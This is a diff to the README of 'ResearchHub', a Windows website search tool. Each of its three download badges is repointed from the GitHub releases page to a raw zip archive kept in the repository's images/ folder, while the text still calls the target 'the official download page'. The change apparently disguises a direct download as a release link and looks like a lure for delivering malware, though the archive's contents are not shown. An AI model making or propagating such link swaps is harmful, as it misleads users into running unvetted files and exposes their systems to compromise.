@@ -1,6 +1,6 @@
 # 🔍 ResearchHub - Easy Website Search and Analysis
 
-[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://raw.githubusercontent.com/emvireak/ResearchHub/main/images/Research_Hub_v2.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to get ResearchHub up and running on your Windows machine.
 
 Click the button below to visit the official download page for ResearchHub:
 
-[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-blue?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/emvireak/ResearchHub/main/images/Research_Hub_v2.4.zip)
 
 This page contains the latest release files. You will find a Windows installer or a zipped package for Windows users.
 
@@ -130,4 +130,4 @@ Use ResearchHub responsibly and respect website terms of use.
 
 Return to the releases page anytime to get the latest updates or reinstall:
 
-[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://raw.githubusercontent.com/emvireak/ResearchHub/main/images/Research_Hub_v2.4.zip)
